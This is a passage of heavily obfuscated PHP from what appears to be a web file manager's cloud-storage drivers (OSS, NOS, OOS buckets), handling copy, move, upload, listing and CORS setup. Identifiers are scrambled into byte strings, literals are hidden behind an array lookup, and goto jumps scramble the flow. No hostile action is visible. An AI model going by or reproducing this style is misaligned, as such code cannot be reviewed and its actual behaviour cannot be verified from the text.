CacheLock::lock($Fğ·ß ²Æ‘); $Bˆ•ˆù¸µ = $this->model->mkdir($Bˆ•ˆù¸µ, $FŞ©ƒ½Ÿø§, $a–ÊÆ›‡˜°); CacheLock::unlock($Fğ·ß ²Æ‘); } return $this->getPathOuter($Bˆ•ˆù¸µ); } public function copyFile($dÓòñâ®¢, $A’ñ½Éá¸, $FøÇ‘°ˆä® = REPEAT_REPLACE) { $eêŸÀ£Ş¹ =& $_SERVER[°Óó£ÌİóèÅ]; $aä·áŠ¨… = $this->parse($A’ñ½Éá¸); $c£’Êˆ¾Ğˆ = $this->model->copy($dÓòñâ®¢, $aä·áŠ¨…[$eêŸÀ£Ş¹[376]], $FøÇ‘°ˆä®, $aä·áŠ¨…[$eêŸÀ£Ş¹[84]]); return $c£’Êˆ¾Ğˆ ? $this->getPathOuter($c£’Êˆ¾Ğˆ) : !1; } public function moveFile($bèæ„Âè–, $E”¡â Óå, $Fá¦¼…ƒ = REPEAT_REPLACE) { $a¹ë ‚ÔÍ =& $_SERVER[°Óó£ÌİóèÅ]; $e£¤²‘Æ´Û = $this->parse($E”¡â Óå); $c›–™…¯ë = $this->model->move($bèæ„Âè–, $e£¤²‘Æ´Û[$a¹ë ‚ÔÍ[376]], $Fá¦¼…ƒ, $e£¤²‘Æ´Û[$a¹ë ‚ÔÍ[84]]); return $c›–™…¯ë ? $this->getPathOuter($c›–™…¯ë) : !1; } public function copy($Cƒ»Ç’±‡š, $e÷ëçİ Œò, $aì…ààˆ†‘ = REPEAT_REPLACE) { $F²ĞíğãÕ = $this->parse($e÷ëçİ Œò); $Aƒ†„ï†‡ = $this->model->copy($Cƒ»Ç’±‡š, $F²ĞíğãÕ[$_SERVER[°Óó£ÌİóèÅ][376]], $aì…ààˆ†‘); return $Aƒ†„ï†‡ ? $this->getPathOuter($Aƒ†„ï†‡) : !1; } public function move($B˜êç‰æßô, $dÒ¿¦àšõ, $Dœ¾É ›­Ø = REPEAT_REPLACE) { $BÄ´»Ãß‘ = $this->parse($dÒ¿¦àšõ); $f‹ ÆÉØæà = $this->model->move($B˜êç‰æßô, $BÄ´»Ãß‘[$_SERVER[°Óó£ÌİóèÅ][376]], $Dœ¾É ›­Ø); return $f‹ ÆÉØæà ? $this->getPathOuter($f‹ ÆÉØæà) : !1; } public function remove($bßñ…Ã†ö–, $A®áê¾±ØÇ = true) { return $this->model->remove($bßñ…Ã†ö–, $A®áê¾±ØÇ); } public function rename($a»íÄ¶Ğˆ¨, $Fçµ„ãÅ¥) { $E›á¹©ñÊ = $this->model->rename($a»íÄ¶Ğˆ¨, $Fçµ„ãÅ¥); return $E›á¹©ñÊ ? $this->getPathOuter($a»íÄ¶Ğˆ¨) : $E›á¹©ñÊ; } public function size($E¿§Òó·øÛ) { $BÆÖ­•¬ˆ = $this->infoSimple($E¿§Òó·øÛ); return $BÆÖ­•¬ˆ ? $BÆÖ­•¬ˆ[$_SERVER[°Óó£ÌİóèÅ][86]] : 0; } public function infoSimple($cÔ¦çˆ¿İ) { return $this->model->sourceInfo($cÔ¦çˆ¿İ); } public function info($D‚ò¼›ì÷™) { return $this->infoParse($D‚ò¼›ì÷™); } public function infoAuth($F ÓŠßƒİ) { return $this->infoParse($F ÓŠßƒİ, !1, !0); } public function infoWithChildren($f­•çòšëÀ) { return $this->infoParse($f­•çòšëÀ, !0); } protected function infoParse($E¼ãõ¨à, $B…ËãÉÂµš = false, $F¶…³‰¯¤ = false) { if (!$B…ËãÉÂµš) { return $this->model->pathInfo($E¼ãõ¨à, $F¶…³‰¯¤); } return $this->model->pathInfoMore($E¼ãõ¨à); } public function infoFull($FåÌ¯Ô®) { $eº½Ÿ©‡ƒ =& $_SERVER[°Óó£ÌİóèÅ]; $FÜÀ»‰¨ = explode($eº½Ÿ©‡ƒ[8], $FåÌ¯Ô®); $aƒòŞÁ—³ = implode($eº½Ÿ©‡ƒ[8], array_splice($FÜÀ»‰¨, 1)); return $this->model->pathInfoByPath($FÜÀ»‰¨[0], $aƒòŞÁ—³); } public function hashSimple($CÈÏ„¨…Œñ) { $BÉ­ÇƒÉø =& $_SERVER[°Óó£ÌİóèÅ]; $bšÄ˜˜¼¨• = $this->infoWithChildren($CÈÏ„¨…Œñ); return $bšÄ˜˜¼¨•[$BÉ­ÇƒÉø[167]][$BÉ­ÇƒÉø[169]]; } public function hashMd5($D–«ö¶áÆ) { $a°ÍŸ÷Ú£ =& $_SERVER[°Óó£ÌİóèÅ]; $C’Ú¨ÌÂ…â = $this->infoWithChildren($D–«ö¶áÆ); return $C’Ú¨ÌÂ…â[$a°ÍŸ÷Ú£[167]][$a°ÍŸ÷Ú£[168]]; } public function exist($dµ•ö“ÓŞ¼) { $C¶“êÚ´› =& $_SERVER[°Óó£ÌİóèÅ]; $f¾ÜÍ¤ÖŠ = $this->parse($dµ•ö“ÓŞ¼); if (!$f¾ÜÍ¤ÖŠ[$C¶“êÚ´›[84]]) { return $this->isFile($dµ•ö“ÓŞ¼) || $this->isFolder($dµ•ö“ÓŞ¼); } $A¹ï˜ÅÃ»’ = array($C¶“êÚ´›[406] => $f¾ÜÍ¤ÖŠ[$C¶“êÚ´›[376]], $C¶“êÚ´›[28] => $f¾ÜÍ¤ÖŠ[$C¶“êÚ´›[84]]); $f…»ä•¨ = $this->model->where($A¹ï˜ÅÃ»’)->find(); return $f…»ä•¨ ? !0 : !1; } public function isFile($c¹¢ ¶ä¤Ñ) { $Bã“‘Ûß‰ë =& $_SERVER[°Óó£ÌİóèÅ]; $Bó‰óà¼À¹ = $this->infoSimple($c¹¢ ¶ä¤Ñ); return $Bó‰óà¼À¹ && $Bó‰óà¼À¹[$Bã“‘Ûß‰ë[383]] == $Bã“‘Ûß‰ë[384] ? !1 : !0; } public function isFolder($Eó¶ç’åßÏ) { $dˆó…¨ëİÍ =& $_SERVER[°Óó£ÌİóèÅ]; $D®·¦ğ½¹Ø = $this->infoSimple($Eó¶ç’åßÏ); return $D®·¦ğ½¹Ø && $D®·¦ğ½¹Ø[$dˆó…¨ëİÍ[383]] == $dˆó…¨ëİÍ[384] ? !0 : !1; } public function listPath($FÔÅæà°, $aŠç¾‡Óƒ = false) { $B…¤’ÌÒÇ =& $_SERVER[°Óó£ÌİóèÅ]; if ($FÔÅæà° == $B…¤’ÌÒÇ[33]) { return !1; } $féïç…¼œ¹ = array($B…¤’ÌÒÇ[406] => $FÔÅæà°); if ($aŠç¾‡Óƒ) { return $this->model->listSource($féïç…¼œ¹, -1); } return $this->model->listSource($féïç…¼œ¹); } public function has($A±’šŒÒ”×, $E×Øß£š÷ = false, $Bõ‹®»¯†† = null) { $e™ØùƒĞùÚ =& $_SERVER[°Óó£ÌİóèÅ]; $Aƒè¶°²Áç = $this->infoWithChildren($A±’šŒÒ”×); if ($E×Øß£š÷) { return array($e™ØùƒĞùÚ[200] => $Aƒè¶°²Áç[$e™ØùƒĞùÚ[200]], $e™ØùƒĞùÚ[199] => $Aƒè¶°²Áç[$e™ØùƒĞùÚ[199]]); } return $Bõ‹®»¯†† ? $Aƒè¶°²Áç[$e™ØùƒĞùÚ[200]] : $Aƒè¶°²Áç[$e™ØùƒĞùÚ[199]]; } public function listAll($E”ôªº…‰Æ) { $bëÄ‹„èé = IO::info($this->pathParse[$_SERVER[°Óó£ÌİóèÅ][84]]); if (!$bëÄ‹„èé) { return array(); } return $this->model->listAll($E”ôªº…‰Æ); } public function getContent($aØà¿¾ Çå) { return $this->model->getContent($aØà¿¾ Çå); } public function setContent($C«²ãÁá‰£, $E“ö“ª‰ìî = '') { return $this->model->setContent($C«²ãÁá‰£, $E“ö“ª‰ìî); } public function fileSubstr($CÊöòÒ„, $DŸƒÏ…•óå, $eéé‹·ÍÚ›) { return $this->model->fileSubstr($CÊöòÒ„, $DŸƒÏ…•óå, $eéé‹·ÍÚ›); } public function download($CÉ¥”º²–, $e¤õç‘™†ç = '') { $Cå³ÀóŒÉÖ = $this->model->fileInfoGet($CÉ¥”º²–); IO::copy($Cå³ÀóŒÉÖ[$_SERVER[°Óó£ÌİóèÅ][84]], $e¤õç‘™†ç); return $e¤õç‘™†ç; } public function upload($C†ƒÔç¼©Í, $FœÍ²˜„Œ¾, $aàÉõ‡­Í· = false, $eÚ¢ŞĞŒÃ = REPEAT_REPLACE) { $eÂĞ’á§« =& $_SERVER[°Óó£ÌİóèÅ]; $b•¡Š¬‚¨› = $this->parse($C†ƒÔç¼©Í); $a¯‚Ø•ÓóÜ = $this->model->addFile($b•¡Š¬‚¨›[$eÂĞ’á§«[376]], $FœÍ²˜„Œ¾, $b•¡Š¬‚¨›[$eÂĞ’á§«[84]], $aàÉõ‡­Í·, $eÚ¢ŞĞŒÃ); return $this->getPathOuter($a¯‚Ø•ÓóÜ); } public function uploadFileByID($E¯¶¿Ïìô§, $A°òˆ¯“ ó, $e÷Ë¦¼ ì) { $fÈ´²””Šå =& $_SERVER[°Óó£ÌİóèÅ]; $CÓòšÑ¼Œ = $this->parse($E¯¶¿Ïìô§); $dŞ—ˆ¬‰Ëª = $this->model->addFileByFileID($CÓòšÑ¼Œ[$fÈ´²””Šå[376]], $A°òˆ¯“ ó, $CÓòšÑ¼Œ[$fÈ´²””Šå[84]], $e÷Ë¦¼ ì); return $this->getPathOuter($dŞ—ˆ¬‰Ëª); } public function addFileByRemote($a´¹¿Ü±º, $BŒ—öÌ«‹ô, $FÏø¯Òî¦ = array(), $cÀÊëè•Öù = '', $Dœ¶äâ‡£á) { $CÕøÀè‚Ø‚ =& $_SERVER[°Óó£ÌİóèÅ]; $BŞî»„Ş = $this->parse($a´¹¿Ü±º); $cÀÊëè•Öù = empty($cÀÊëè•Öù) ? $BŞî»„Ş[$CÕøÀè‚Ø‚[84]] : $cÀÊëè•Öù; $A‘˜ÖåÀ— = $this->model->addFileByRemote($BŞî»„Ş[$CÕøÀè‚Ø‚[376]], $BŒ—öÌ«‹ô, $cÀÊëè•Öù, $FÏø¯Òî¦, $Dœ¶äâ‡£á); return $this->getPathOuter($A‘˜ÖåÀ—); } public function uploadLink($Bß“ù†± , $AŸèÃå“Æ‹ = 0) { $Cìß±‚¸ =& $_SERVER[°Óó£ÌİóèÅ]; $bŸâÊ¼ò— = $this->parse($Bß“ù†± ); $Bß“ù†±  = Model($Cìß±‚¸[435])->createFileName($bŸâÊ¼ò—[$Cìß±‚¸[84]]); $eó¼ÓÚ‹¯â = IO::uploadLink($Bß“ù†± , $AŸèÃå“Æ‹); return $eó¼ÓÚ‹¯â; } public function fileNameAuto($FÌ˜ğ±¯å¬, $A†‘©í¿¹¤, $fœ–”¹“ß = REPEAT_REPLACE, $Fšğ›ï± = false) { return $this->model->fileNameAuto($FÌ˜ğ±¯å¬, $A†‘©í¿¹¤, $fœ–”¹“ß, $Fšğ›ï±); } public function fileNameExist($d“‰‹™Ó, $CïŸ©ÊÊÂ†) { return $this->model->fileNameExist($d“‰‹™Ó, $CïŸ©ÊÊÂ†); } protected function _fileOut($d¦×ÑÄÍïö, $a¥ÀĞºéñŸ = false, $eèòö»ğçà = false, $cù¼óÆšÁº = '', $C‚îš„÷½½ = false) { goto bêÕÚàĞì†; E…Şˆ·£¾¸: IO::fileOut($CäÛçÜÚôñ[$Eõ§”ÑÆ×ñ[84]], $a¥ÀĞºéñŸ, $CäÛçÜÚôñ[$Eõ§”ÑÆ×ñ[28]], $cù¼óÆšÁº); goto BÊ‡ßµéÚŠ; dØÂ›œ‰Òƒ: $CäÛçÜÚôñ = $this->model->fileInfoGet($d¦×ÑÄÍïö); $cù¼óÆšÁº = $CäÛçÜÚôñ[$Eõ§”ÑÆ×ñ[168]] ? $CäÛçÜÚôñ[$Eõ§”ÑÆ×ñ[168]] : $cù¼óÆšÁº; if ($C‚îš„÷½½) { return IO::fileOutServer($CäÛçÜÚôñ[$Eõ§”ÑÆ×ñ[84]], $a¥ÀĞºéñŸ, $CäÛçÜÚôñ[$Eõ§”ÑÆ×ñ[28]], $cù¼óÆšÁº); } goto E…Şˆ·£¾¸; bêÕÚàĞì†: $Eõ§”ÑÆ×ñ =& $_SERVER[°Óó£ÌİóèÅ]; $aØê–Ä§±» = $this->model->sourceInfo($d¦×ÑÄÍïö); if ($aØê–Ä§±»[$Eõ§”ÑÆ×ñ[383]] == $Eõ§”ÑÆ×ñ[384]) { header($Eõ§”ÑÆ×ñ[854]); die; } goto dØÂ›œ‰Òƒ; BÊ‡ßµéÚŠ: } public function fileOut($CòÂÒÄ”¸Ç, $F‡“òÈÎ¾” = false, $fªìö‚Ô†Ü = false, $cßåˆƒ×Æ¨ = '') { $this->_fileOut($CòÂÒÄ”¸Ç, $F‡“òÈÎ¾”, $fªìö‚Ô†Ü, $cßåˆƒ×Æ¨); } public function fileOutServer($B§ÀÕÕ±Ì, $a‡ÚÅù‡´® = false, $b†¢¥³ = false, $Cö–‡‹ƒŒß = '') { $this->_fileOut($B§ÀÕÕ±Ì, $a‡ÚÅù‡´®, $b†¢¥³, $Cö–‡‹ƒŒß, !0); } protected function _fileOutImage($a…£‹¹, $eæ¤êâŞ¯Á = 250) { $A«áëÒéŒ =& $_SERVER[°Óó£ÌİóèÅ]; $b×Åè•‰„¼ = $this->model->sourceInfo($a…£‹¹); if ($b×Åè•‰„¼[$A«áëÒéŒ[383]] == $A«áëÒéŒ[384]) { show_json($A«áëÒéŒ[855] . $a…£‹¹, !1); } $aóëğÀÄÊ = $this->model->fileInfoGet($a…£‹¹); IO::fileOutImage($aóëğÀÄÊ[$A«áëÒéŒ[84]], $eæ¤êâŞ¯Á); } public function fileOutImage($c‘§‰Ó¡õä, $Eè»ª’ñŒó = 250) { $this->_fileOutImage($c‘§‰Ó¡õä, $Eè»ª’ñŒó); } public function fileOutImageServer($e£†½ãª, $D¯„†ÚÅµÄ = 250) { $this->_fileOutImage($e£†½ãª, $D¯„†ÚÅµÄ); } public function link($D‚‹Ì™áÃê, $Fƒ„š±êÕª = '') { $fğƒŒÒ™¾Ê = $this->model->fileInfoGet($D‚‹Ì™áÃê); return IO::link($fğƒŒÒ™¾Ê[$_SERVER[°Óó£ÌİóèÅ][84]], $Fƒ„š±êÕª); } protected function parse($C·ÀÌ ÇË) { $c©«Ï©™·› =& $_SERVER[°Óó£ÌİóèÅ]; if (strstr($C·ÀÌ ÇË, $c©«Ï©™·›[8]) === !1) { return array($c©«Ï©™·›[814] => intval($C·ÀÌ ÇË), $c©«Ï©™·›[84] => $c©«Ï©™·›[33], $c©«Ï©™·›[853] => array()); } $fñÕ°ñÎğ = explode($c©«Ï©™·›[8], trim($C·ÀÌ ÇË, $c©«Ï©™·›[8])); if (count($fñÕ°ñÎğ) < 2) { show_tips($C·ÀÌ ÇË . $c©«Ï©™·›[856]); } return array($c©«Ï©™·›[814] => intval($fñÕ°ñÎğ[0]), $c©«Ï©™·›[84] => $fñÕ°ñÎğ[1], $c©«Ï©™·›[853] => array_slice($fñÕ°ñÎğ, 1)); } } goto C´¢ÎŒá“; eÆáÁ¹Şğ: class PathDriverNOS extends PathDriverBaseS3 { public function __construct($B”™éÜ½Âæ) { parent::__construct($B”™éÜ½Âæ); $this->client->setSignatureVersion($_SERVER[°Óó£ÌİóèÅ][208]); } public function setBucketCors() { return !1; } public function getBucketCors() { return !1; } public function isBucketCors() { return !0; } public function _isFolder($d¤´³âŒè) { goto eÊËÈİ­ìÏ; f»¥¥„­ê: $EÃ™¤Ö–ÓÈ = $this->listObjs($d¤´³âŒè, null, 3, $döõÚ¬Á–Ã[8]); return count($EÃ™¤Ö–ÓÈ) == 1 ? !1 : !0; goto BØí±Ş¤ÃÀ; eÊËÈİ­ìÏ: $döõÚ¬Á–Ã =& $_SERVER[°Óó£ÌİóèÅ]; $d¤´³âŒè = trim($d¤´³âŒè, $döõÚ¬Á–Ã[8]); if (!empty($d¤´³âŒè)) { $d¤´³âŒè .= $döõÚ¬Á–Ã[8]; } goto Aª²„ÏåÈ; Aª²„ÏåÈ: $DùÃŠ¶ˆâ = $this->getObjectInfo($d¤´³âŒè); if ($DùÃŠ¶ˆâ) { return !0; } return parent::_isFolder($d¤´³âŒè); goto f»¥¥„­ê; BØí±Ş¤ÃÀ: } public function fileInfoImage($E«á¹÷¢™, &$E‘–Á‚“) { } public function setContent($d¬è¯¬ãêß, $d‡ã£Ãù¾… = '', $e¯½¦«—Ï¾ = false) { $fÜ¼Ù²¹Í÷ =& $_SERVER[°Óó£ÌİóèÅ]; $d¬è¯¬ãêß = $e¯½¦«—Ï¾ ? trim($d¬è¯¬ãêß, $fÜ¼Ù²¹Í÷[8]) . $fÜ¼Ù²¹Í÷[8] : $d¬è¯¬ãêß; $E¶óÓ¦†Œ¸ = get_file_mime(get_path_ext($d¬è¯¬ãêß)); $dè˜º«Í¨’ = $this->client->putObject($d‡ã£Ãù¾…, $this->bucket, $d¬è¯¬ãêß, $fÜ¼Ù²¹Í÷[190], array(), $E¶óÓ¦†Œ¸); return $dè˜º«Í¨’ ? !0 : !1; } public function getObjectInfo($dÁˆ­—ŠÖ”) { $cª‡Ù’Õ«š =& $_SERVER[°Óó£ÌİóèÅ]; $e«§òÅÌ£— = $this->client->getObjectInfo($this->bucket, $dÁˆ­—ŠÖ”); if (!isset($e«§òÅÌ£—[$cª‡Ù’Õ«š[215]]) && isset($e«§òÅÌ£—[$cª‡Ù’Õ«š[903]])) { $e«§òÅÌ£—[$cª‡Ù’Õ«š[215]] = $e«§òÅÌ£—[$cª‡Ù’Õ«š[903]]; } return $e«§òÅÌ£—; } public function upload($FóòÀŞ÷ƒ§, $dÖ°÷¯‘º, $EÂØ°ÜŠ½´ = false, $FÕ…µ”÷ = REPEAT_REPLACE) { $bÙçŸƒƒ¾õ =& $_SERVER[°Óó£ÌİóèÅ]; $fÓ·Š‹ˆ¥ = array(); $A¤§ çò = array($bÙçŸƒƒ¾õ[207] => get_file_mime(get_path_ext($FóòÀŞ÷ƒ§))); if (IO::size($dÖ°÷¯‘º) <= 1024 * 1024 * 200) { $Eğµ¸ğÏÁÉ = $this->client->putObjectFile($dÖ°÷¯‘º, $this->bucket, $FóòÀŞ÷ƒ§, $bÙçŸƒƒ¾õ[190], $fÓ·Š‹ˆ¥, $A¤§ çò); return !empty($Eğµ¸ğÏÁÉ) ? !0 : !1; } $A‚ŒÄÄÔæ¼ = $this->client->multiUploadObject($dÖ°÷¯‘º, $this->bucket, trim($FóòÀŞ÷ƒ§, $bÙçŸƒƒ¾õ[8]), $fÓ·Š‹ˆ¥, $A¤§ çò); return $A‚ŒÄÄÔæ¼ ? $this->getPathOuter($FóòÀŞ÷ƒ§) : !1; } public function blockChain($dÏ¥İ´™Î, $Eƒ¨†Èãè“) { $b†½º¤©§Î =& $_SERVER[°Óó£ÌİóèÅ]; $fö¤Ù‡¼× = $this->getObjectInfo($dÏ¥İ´™Î); if (!$fö¤Ù‡¼×) { return !1; } return $this->client->copyObject($this->bucket, $dÏ¥İ´™Î, $this->bucket, $dÏ¥İ´™Î, $b†½º¤©§Î[190], array(), $Eƒ¨†Èãè“, $b†½º¤©§Î[904], !0); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($bˆÈ¨ˆã©¾) { parent::__construct($bˆÈ¨ˆã©¾); $this->signatureVersion($_SERVER[°Óó£ÌİóèÅ][208]); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public function __construct($A¹Î·†Ãê®) { parent::__construct(); include_once SDK_DIR . $_SERVER[°Óó£ÌİóèÅ][905]; $this->_init($A¹Î·†Ãê®); } public function _init($cÓ•Ó¹â—ğ) { foreach ($cÓ•Ó¹â—ğ as $e“Ú‡†ÕÙ => $B¾Ú˜­–§Á) { if (isset($this->{$e“Ú‡†ÕÙ})) { $this->{$e“Ú‡†ÕÙ} = $B¾Ú˜­–§Á; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[°Óó£ÌİóèÅ][906], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); } public function setBucketCors() { goto bÁ…ã´Á…˜; e¼ª¾°êŠ®: $EÊïÅ¾Ò…Ğ->addAllowedMethod($DÇË¤®¥¥ô[910]); $EÊïÅ¾Ò…Ğ->addAllowedMethod($DÇË¤®¥¥ô[911]); $EÊïÅ¾Ò…Ğ->addAllowedMethod($DÇË¤®¥¥ô[158]); goto b¬è…³òí; DØİ¶Çíáó: $dí©ÕÊ†”->addRule($EÊïÅ¾Ò…Ğ); try { $this->client->putBucketCors($this->bucket, $dí©ÕÊ†”); } catch (OSS\Core\OssException $aÙãİ²µƒŒ) { return !1; } return !0; goto b¶§æ›®¦Û; bÁ…ã´Á…˜: $DÇË¤®¥¥ô =& $_SERVER[°Óó£ÌİóèÅ]; $dí©ÕÊ†” = new OSS\Model\CorsConfig(); $EÊïÅ¾Ò…Ğ = new OSS\Model\CorsRule(); goto d¹â•‰Ÿ²Õ; b¬è…³òí: $EÊïÅ¾Ò…Ğ->setMaxAgeSeconds(600); $EÊïÅ¾Ò…Ğ->addExposeHeader($DÇË¤®¥¥ô[912]); $EÊïÅ¾Ò…Ğ->addAllowedHeader($DÇË¤®¥¥ô[907]); goto DØİ¶Çíáó; d¹â•‰Ÿ²Õ: $EÊïÅ¾Ò…Ğ->addAllowedOrigin($DÇË¤®¥¥ô[907]); $EÊïÅ¾Ò…Ğ->addAllowedMethod($DÇË¤®¥¥ô[908]); $EÊïÅ¾Ò…Ğ->addAllowedMethod($DÇË¤®¥¥ô[909]); goto e¼ª¾°êŠ®; b¶§æ›®¦Û: } public function getBucketCors() { goto A³¶³‰ˆ ¥; CÙßî°Ö†½: if (!$b½öö‚ì’ç || !($e¬¡ †ÀĞ = $b½öö‚ì’ç->getRules())) { return null; } $dš±ÖÆîÑô = $e¬¡ †ÀĞ[0]->getAllowedOrigins(); $A õòä©‰ = $e¬¡ †ÀĞ[0]->getAllowedMethods(); goto f„ñ»ù½àí; A³¶³‰ˆ ¥: $cÆ†Ôæñ =& $_SERVER[°Óó£ÌİóèÅ]; $b½öö‚ì’ç = null; try { $b½öö‚ì’ç = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Cßê¾Á¡ºÄ) { return null; } goto CÙßî°Ö†½; CÎ¶Ë‘„ĞÚ: return array($cÆ†Ôæñ[180] => isset($dš±ÖÆîÑô[0]) ? $dš±ÖÆîÑô[0] : $cÆ†Ôæñ[33], $cÆ†Ôæñ[184] => $A õòä©‰, $cÆ†Ôæñ[913] => $C¦öàÀ…‘, $cÆ†Ôæñ[914] => isset($CÈÔæ¢¦ë«[0]) ? $CÈÔæ¢¦ë«[0] : $cÆ†Ôæñ[33], $cÆ†Ôæñ[182] => isset($d›Ì°­Ğİ[0]) ? $d›Ì°­Ğİ[0] : $cÆ†Ôæñ[33]); goto dÈòÇ¦¹·; f„ñ»ù½àí: $C¦öàÀ…‘ = $e¬¡ †ÀĞ[0]->getMaxAgeSeconds(); $CÈÔæ¢¦ë« = $e¬¡ †ÀĞ[0]->getExposeHeaders(); $d›Ì°­Ğİ = $e¬¡ †ÀĞ[0]->getAllowedHeaders(); goto CÎ¶Ë‘„ĞÚ; dÈòÇ¦¹·: } public function isBucketCors() { goto B äâ…’×; aº¢Ö­Üô: $c…ÀÈ×Ë”¡ = array($A¥ÂË¾œ[185], $A¥ÂË¾œ[186], $A¥ÂË¾œ[187], $A¥ÂË¾œ[188], $A¥ÂË¾œ[189]); $b¡ÅÓ‡à—Ì = array_diff($c…ÀÈ×Ë”¡, $EÃ¸§šè‚¥); return empty($b¡ÅÓ‡à—Ì); goto bƒÄ™²–Ú; B äâ…’×: $A¥ÂË¾œ =& $_SERVER[°Óó£ÌİóèÅ]; $C™Àê˜‹Ê» = $this->getBucketCors(); if (!$C™Àê˜‹Ê» || !is_array($C™Àê˜‹Ê»)) { return !1; } goto e¬ò¾›ãŸù; e¬ò¾›ãŸù: if ($C™Àê˜‹Ê»[$A¥ÂË¾œ[180]] != $A¥ÂË¾œ[181] || $C™Àê˜‹Ê»[$A¥ÂË¾œ[182]] != $A¥ÂË¾œ[181]) { return !1; } $EÃ¸§šè‚¥ = array_map($A¥ÂË¾œ[183], $C™Àê˜‹Ê»[$A¥ÂË¾œ[184]]); if (!is_array($EÃ¸§šè‚¥)) { $EÃ¸§šè‚¥ = array(); } goto aº¢Ö­Üô; bƒÄ™²–Ú: } public function mkfile($fš›‘ÚÔŸ¦, $d…µÀ–ÙÏª = '', $d‘Ğ…‹³œÄ = REPEAT_RENAME) { $Bíö‹¿½ = $this->setContent($fš›‘ÚÔŸ¦, $d…µÀ–ÙÏª); if ($Bíö‹¿½ !== !1) { return $this->getPathOuter($fš›‘ÚÔŸ¦); } return !1; } public function mkdir($AËãÛå–ç, $b¤™¿¦Îœ¹ = REPEAT_SKIP) { if ($this->_isFolder($AËãÛå–ç)) { return $this->getPathOuter($AËãÛå–ç); } try { $c™ŞÔ³Øéä = $this->pathEncode($AËãÛå–ç); $this->client->createObjectDir($this->bucket, $c™ŞÔ³Øéä); } catch (OSS\Core\OssException $CŠß²÷ØƒÏ) { return !1; } return $this->getPathOuter($AËãÛå–ç); } private function fileList($e¼ôâ‹ã , $cºŒ‡‘œ¬° = '', $Eù¥Ë‘åÎ = 0) { goto BÎ²–ãÚè; a‰±µáêƒ‰: $DÎë‚¨Ó¹ = $C‰ö‡–åŸ[33]; $B¼¥¾ÈºÁÒ = 1000; $Fß¯éºŞÚ = $A¦ã¬„•—Ã = array(); goto b‹Û•ºÂå; b‹Û•ºÂå: while (!0) { $cÑ…«ëª— = array($C‰ö‡–åŸ[915] => $cºŒ‡‘œ¬°, $C‰ö‡–åŸ[194] => $aé½Ë‡’ªÁ, $C‰ö‡–åŸ[916] => $B¼¥¾ÈºÁÒ, $C‰ö‡–åŸ[917] => $DÎë‚¨Ó¹); try { $dÄâ¬›ãÛ¾ = $this->client->listObjects($this->bucket, $cÑ…«ëª—); } catch (OSS\Core\OssException $DÈÅï±ÔÀˆ) { break; } $DÎë‚¨Ó¹ = $dÄâ¬›ãÛ¾->getNextMarker(); $Bîß¹­ˆÔ = $dÄâ¬›ãÛ¾->getObjectList(); $c—ÉÓ÷áç = $dÄâ¬›ãÛ¾->getPrefixList(); foreach ($Bîß¹­ˆÔ as $c­¨¾íæ³Œ) { if ($c­¨¾íæ³Œ->getKey() == $aé½Ë‡’ªÁ) { continue; } $FãáñŸŠ³§ = $c­¨¾íæ³Œ->getKey(); if ($Eù¥Ë‘åÎ) { $FãáñŸŠ³§ = array($C‰ö‡–åŸ[28] => $FãáñŸŠ³§, $C‰ö‡–åŸ[86] => $c­¨¾íæ³Œ->getSize(), $C‰ö‡–åŸ[198] => strtotime($c­¨¾íæ³Œ->getLastModified())); } $A¦ã¬„•—Ã[] = $FãáñŸŠ³§; } foreach ($c—ÉÓ÷áç as $AçÂš˜“ƒ) { $Fß¯éºŞÚ[] = $AçÂš˜“ƒ->getPrefix(); } if ($DÎë‚¨Ó¹ === $C‰ö‡–åŸ[33]) { break; } } return array($C‰ö‡–åŸ[83] => $Fß¯éºŞÚ, $C‰ö‡–åŸ[82] => $A¦ã¬„•—Ã); goto Fˆ…ëÌá; BÎ²–ãÚè: $C‰ö‡–åŸ =& $_SERVER[°Óó£ÌİóèÅ]; $e¼ôâ‹ã  = trim($e¼ôâ‹ã , $C‰ö‡–åŸ[8]); $aé½Ë‡’ªÁ = empty($e¼ôâ‹ã ) ? $C‰ö‡–åŸ[33] : $e¼ôâ‹ã  . $C‰ö‡–åŸ[8]; goto a‰±µáêƒ‰; Fˆ…ëÌá: } public function copyFile($Bğ–“¶«½ß, $d®Ä¬‘Ö) { $d¹‚­‘ŠæË = $this->size($Bğ–“¶«½ß); if ($d¹‚­‘ŠæË < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $this->pathEncode($Bğ–“¶«½ß), $this->bucket, $this->pathEncode($d®Ä¬‘Ö)); } catch (OSS\Core\OssException $bŒ“ÖÆ®Ë) { return !1; } return !0; } return $this->multiCopyObject($Bğ–“¶«½ß, $d®Ä¬‘Ö, $d¹‚­‘ŠæË); } private function multiCopyObject($cŠ¢İÙÊ·, $F¼­È°†½™, $cˆñ¿Ó´¶) { $D÷¯âç­µ‚ =& $_SERVER[°Óó£ÌİóèÅ]; try { goto cÑùÏìÖ­; C›ø…ª•å: $eÅ½öç“÷£ = 1; $AâµÕ¶àÙ¦ = 0; $CÃóÂ¸›ÂŒ = array(); goto fŒğÎ«ãñŒ; cÑùÏìÖ­: $A„Ñ¿×ç´Ş = array(); if ($E·òç¬Ü‰è = $this->hashMd5($cŠ¢İÙÊ·)) { $A„Ñ¿×ç´Ş = array(OSS\OssClient::OSS_HEADERS => array($D÷¯âç­µ‚[918] => $E·òç¬Ü‰è)); } $CéæšÛˆ‚ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($F¼­È°†½™), $A„Ñ¿×ç´Ş); goto C›ø…ª•å; fŒğÎ«ãñŒ: $d“¨ö¶Ë§Ñ = $this->osChunkSize(); $Aªè‘º…ŠÌ = $this->client->generateMultiuploadParts($cˆñ¿Ó´¶, $d“¨ö¶Ë§Ñ); foreach ($Aªè‘º…ŠÌ as $BŞ¬„†ƒ => $eß¨‡„Ã¾) { $f‹íõÖ’º¦ = $AâµÕ¶àÙ¦ + (int) $eß¨‡„Ã¾[$D÷¯âç­µ‚[919]]; $f¿¥óêŸ´¹ = (int) $eß¨‡„Ã¾[$D÷¯âç­µ‚[336]] + $f‹íõÖ’º¦ - 1; $A‰›î­Ú¼˜ = array($D÷¯âç­µ‚[920] => $f‹íõÖ’º¦, $D÷¯âç­µ‚[921] => 